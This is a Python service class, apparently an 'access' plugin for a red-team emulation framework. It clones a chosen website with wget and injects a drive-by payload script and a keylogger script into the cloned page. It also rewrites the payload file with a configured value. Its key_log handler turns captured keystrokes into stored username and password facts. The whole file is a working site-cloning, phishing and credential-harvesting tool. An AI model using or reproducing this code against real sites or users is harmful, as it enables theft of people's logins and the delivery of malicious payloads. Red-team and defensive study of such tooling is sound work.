import subprocess
from urllib.parse import urlparse

from aiohttp import web
from aiohttp_jinja2 import template

from app.objects.c_fact import Fact


class AccessService:

    def __init__(self, services, props):
        self.app_svc = services.get('app_svc')
        self.data_svc = services.get('data_svc')
        self.props = props

    @template('access.html')
    async def landing(self, request):
        full_cloned_url = '%s%s' % (request.host, self.props.get('clone_url'))
        sources = [s.display for s in await self.data_svc.locate('sources')]
        return dict(sources=sources,
                    clone_url=full_cloned_url,
                    clone_site=self.props.get('clone_site'),
                    clone_payload=self.props.get('clone_payload'))

    @staticmethod
    async def malicious(request):
        return web.HTTPFound('/access/malicious/index.html')

    async def update_props(self, request):
        body = await request.json()
        self.props['clone_site'] = body['clone_site']
        self.props['inject_payload'] = body['inject_payload']
        self.props['inject_keylogger'] = body['inject_keylogger']
        self.props['assigned_source'] = body['source']
        await self.clone_new_site(body['clone_site'])
        return web.json_response(dict(clone_site=self.props['clone_site']))

    async def key_log(self, request):
        body = await request.json()
        await self._parse_key_logger(blob=body['log'])
        return web.HTTPOk()

    async def clone_new_site(self, url):
        if self._valid_url(url):
            self._replace_payload()
            location = 'plugins/access/static/malicious'
            open('%s/index.html' % location, 'w').close()
            user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) " \
                         "Chrome/76.0.3809.100 Safari/537.36"
            subprocess.call(["wget", "-U", user_agent, "-E", "-H", "-k", "-K", "-p", "-q", "-nH", "--cut-dirs=1", url,
                             "--directory", location, "--no-check-certificate"], shell=False)
            if self.props['inject_payload']:
                self.app_svc.prepend_to_file('%s/index.html' % location, '<script src="/access/malicious/drive.js"></script>')
            if self.props['inject_keylogger']:
                self.app_svc.prepend_to_file('%s/index.html' % location, '<script src="/access/malicious/keys.js"></script>')
            self.app_svc.prepend_to_file('%s/index.html' % location, '<script src="/gui/jquery/jquery.js"></script>')
            self.app_svc.prepend_to_file('%s/index.html' % location, '<meta http-equiv="Expires" content="0">')
            self.app_svc.prepend_to_file('%s/index.html' % location, '<meta http-equiv="Pragma" content="no-cache">')
            self.app_svc.prepend_to_file('%s/index.html' % location, '<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">')

    """ PRIVATE """

    @staticmethod
    def _valid_url(url):
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except Exception:
            return False

    def _replace_payload(self):
        malicious_js = 'plugins/access/static/malicious/drive.js'
        with open(malicious_js, 'r') as fin:
            data = fin.read().splitlines(True)
        with open(malicious_js, 'w') as fout:
            fout.writelines(data[1:])
        self.app_svc.prepend_to_file(malicious_js, 'let PAYLOAD = "%s";' % self.props['clone_payload'])

    async def _parse_key_logger(self, blob):
        creds = blob.split('Tab')
        source = await self.data_svc.locate('sources', match=dict(name=self.props['assigned_source']))
        source[0].facts.append(Fact(trait='host.user.name', value=creds[0]))
        source[0].facts.append(Fact(trait='host.user.password', value=creds[1]))
